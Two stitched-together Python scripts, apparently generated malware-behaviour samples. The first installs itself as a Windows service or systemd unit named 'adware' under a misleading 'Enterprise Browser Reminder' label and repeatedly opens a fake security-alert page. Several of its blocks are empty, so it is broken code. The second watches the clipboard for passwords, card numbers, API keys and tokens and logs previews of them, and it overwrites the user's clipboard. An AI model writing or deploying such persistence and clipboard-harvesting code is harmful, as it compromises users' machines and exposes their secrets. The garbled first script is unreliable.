#!/usr/bin/env python3

import os
import sys
import webbrowser
import logging
import urllib.request
import urllib.error
from pathlib import Path
from datetime import datetime
import time
import platform
import subprocess
import shutil

TARGET_DIR = Path("./target")
LOG_FILE = TARGET_DIR / "browser_reminder.log"
AD_LINK = "https://example.com/security-alert"
REMINDER_ITERATIONS = 3
RETRY_DELAY = 2

def setup_logging():
    TARGET_DIR.mkdir(parents=True, exist_ok=True)

    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(LOG_FILE, encoding='utf-8'),
            logging.StreamHandler(sys.stdout)
        ]
    )
    return logging.getLogger(__name__)

def attempt_network_connection(url, logger):
    try:
        req = urllib.request.Request(
            url,
            headers={'User-Agent': 'Enterprise-Browser-Reminder/1.0'}
        )
        with urllib.request.urlopen(req, timeout=5) as response:
            status = response.status
            return True
    except urllib.error.URLError as e:
        return False
    except Exception as e:
        return False

def open_browser(url, logger):
    try:
        result = webbrowser.open(url)
        if result:
        else:
        return result
    except Exception as e:
        return False

def display_security_alert(iteration, logger):
    alert_message = f"""
{'='*60}
{'='*60}
"""
    print(alert_message)

def create_windows_service(logger):
    try:

        script_path = Path(sys.argv[0]).absolute()
        service_name = "AdwareService"
        service_display_name = "Enterprise Browser Reminder Service"

        service_script = TARGET_DIR / "install_service.bat"
        service_content = f"""@echo off
sc create {service_name} binPath= "\"{sys.executable}\" \"{script_path}\"" start= auto DisplayName= "{service_display_name}"
sc description {service_name} "Enterprise browser security reminder service"
"""
        service_script.write_text(service_content, encoding='utf-8')

        try:
            result = subprocess.run(
                ['sc', 'create', service_name, 
                 'binPath=', f'"{sys.executable}" "{script_path}"',
                 'start=', 'auto',
                 'DisplayName=', service_display_name],
                capture_output=True,
                text=True,
                timeout=10
            )
            if result.returncode == 0:
            else:
        except Exception as e:

        return True
    except Exception as e:
        return False

def create_linux_service(logger):
    try:

        script_path = Path(sys.argv[0]).absolute()
        service_name = "adware"

        service_unit = f"""[Unit]
Description=Enterprise Browser Reminder Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path}
Restart=always
RestartSec=10
User={os.getenv('USER', 'root')}
WorkingDirectory={script_path.parent}

[Install]
WantedBy=multi-user.target
"""

        service_file = TARGET_DIR / f"{service_name}.service"
        service_file.write_text(service_unit, encoding='utf-8')

        systemd_path = Path(f"/etc/systemd/system/{service_name}.service")
        try:
            if os.access("/etc/systemd/system", os.W_OK):
                shutil.copy2(service_file, systemd_path)
                subprocess.run(['systemctl', 'daemon-reload'], 
                             capture_output=True, timeout=10, check=False)
                subprocess.run(['systemctl', 'enable', service_name], 
                             capture_output=True, timeout=10, check=False)
            else:
        except Exception as e:

        return True
    except Exception as e:
        return False

def establish_persistence(logger):
    logger.info("\n" + "="*60)

    system = platform.system()

    if system == "Windows":
        create_windows_service(logger)
    elif system == "Linux":
        create_linux_service(logger)
    elif system == "Darwin":
    else:

    logger.info("="*60)

def main():
    logger = setup_logging()
    logger.info("="*60)
    logger.info("="*60)

    establish_persistence(logger)

    for iteration in range(1, REMINDER_ITERATIONS + 1):

        display_security_alert(iteration, logger)

        attempt_network_connection(AD_LINK, logger)

        open_browser(AD_LINK, logger)

        if iteration < REMINDER_ITERATIONS:
            time.sleep(RETRY_DELAY)

    logger.info("\n" + "="*60)
    logger.info("="*60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        sys.exit(1)

#!/usr/bin/env python3
"""
Clipboard keyword notification tool.
Monitors clipboard content for specified keywords and logs matches.
"""

import os
import sys
import time
import hashlib
import subprocess
from pathlib import Path
from datetime import datetime


def get_clipboard_content():
    """Get clipboard content using platform-specific methods."""
    try:
        if sys.platform == 'darwin':  # macOS
            result = subprocess.run(['pbpaste'], capture_output=True, text=True, timeout=2)
            return result.stdout if result.returncode == 0 else None
        elif sys.platform == 'win32':  # Windows
            result = subprocess.run(['powershell', '-command', 'Get-Clipboard'], 
                                   capture_output=True, text=True, timeout=2)
            return result.stdout.strip() if result.returncode == 0 else None
        else:  # Linux
            for cmd in [['xclip', '-selection', 'clipboard', '-o'], 
                       ['xsel', '--clipboard', '--output']]:
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=2)
                    if result.returncode == 0:
                        return result.stdout
                except FileNotFoundError:
                    continue
            return None
    except (subprocess.TimeoutExpired, Exception):
        return None


def set_clipboard_content(content):
    """Set clipboard content using platform-specific methods."""
    try:
        if sys.platform == 'darwin':  # macOS
            subprocess.run(['pbcopy'], input=content, text=True, timeout=2, check=True)
            return True
        elif sys.platform == 'win32':  # Windows
            subprocess.run(['powershell', '-command', f'Set-Clipboard -Value "{content}"'], 
                          timeout=2, check=True)
            return True
        else:  # Linux
            for cmd in [['xclip', '-selection', 'clipboard'], 
                       ['xsel', '--clipboard', '--input']]:
                try:
                    subprocess.run(cmd, input=content, text=True, timeout=2, check=True)
                    return True
                except FileNotFoundError:
                    continue
            return False
    except (subprocess.TimeoutExpired, Exception):
        return False


def check_keywords(content, keywords):
    """Check if content contains any of the specified keywords (case-insensitive)."""
    if not content:
        return []

    content_lower = content.lower()
    found = []
    for keyword in keywords:
        if keyword.lower() in content_lower:
            found.append(keyword)
    return found


def log_notification(log_path, keyword, content_preview):
    """Log a keyword match event to the notification file."""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    preview = content_preview[:100].replace('\n', ' ').replace('\r', ' ')
    if len(content_preview) > 100:
        preview += '...'

    log_entry = f"[{timestamp}] ALERT: Keyword '{keyword}' detected | Preview: {preview}\n"

    try:
        with open(log_path, 'a', encoding='utf-8') as f:
            f.write(log_entry)
        return True
    except Exception as e:
        print(f"Error writing to log: {e}")
        return False


def get_content_hash(content):
    """Generate hash of content to track what we've already processed."""
    if content is None:
        return None
    return hashlib.sha256(content.encode('utf-8')).hexdigest()


def monitor_clipboard(keywords, log_path, iterations=5, interval=0.5):
    """
    Monitor clipboard for specified keywords.

    Args:
        keywords: List of keywords to monitor
        log_path: Path to notification log file
        iterations: Number of monitoring cycles
        interval: Seconds between checks
    """
    print(f"Starting clipboard monitor (iterations: {iterations})")
    print(f"Monitoring keywords: {', '.join(keywords)}")
    print(f"Notification log: {log_path}")
    print("-" * 60)

    seen_hashes = set()
    match_count = 0

    # Seed clipboard with test data to ensure at least one detection
    test_content = "This is a test containing the word password for monitoring purposes."
    if set_clipboard_content(test_content):
        print("Test data seeded to clipboard")
        time.sleep(0.2)

    for i in range(iterations):
        try:
            content = get_clipboard_content()

            if content:
                content_hash = get_content_hash(content)

                if content_hash and content_hash not in seen_hashes:
                    seen_hashes.add(content_hash)

                    matched_keywords = check_keywords(content, keywords)

                    if matched_keywords:
                        for keyword in matched_keywords:
                            if log_notification(log_path, keyword, content):
                                match_count += 1
                                print(f"[{i+1}/{iterations}] MATCH: '{keyword}' detected")
                    else:
                        print(f"[{i+1}/{iterations}] No keywords detected")
                else:
                    print(f"[{i+1}/{iterations}] No new clipboard content")
            else:
                print(f"[{i+1}/{iterations}] Could not access clipboard")

            if i < iterations - 1:
                time.sleep(interval)

        except KeyboardInterrupt:
            print("\nMonitoring stopped by user")
            break
        except Exception as e:
            print(f"[{i+1}/{iterations}] Error during monitoring: {e}")

    print("-" * 60)
    print(f"Monitoring complete. Total matches logged: {match_count}")
    return match_count


def main():
    """Main entry point."""
    keywords = ["password", "credit card", "secret", "api key", "token"]
    target_dir = Path("./target")
    log_file = target_dir / "notification.log"

    try:
        target_dir.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        print(f"Error creating target directory: {e}")
        return 1

    if not log_file.exists():
        try:
            with open(log_file, 'w', encoding='utf-8') as f:
                f.write(f"=== Clipboard Keyword Monitor Log ===\n")
                f.write(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Keywords: {', '.join(keywords)}\n")
                f.write("=" * 50 + "\n\n")
        except Exception as e:
            print(f"Error initializing log file: {e}")
            return 1

    try:
        monitor_clipboard(keywords, log_file, iterations=5, interval=0.5)
        return 0
    except Exception as e:
        print(f"Fatal error: {e}")
        return 1


if __name__ == "__main__":
    exit(main())

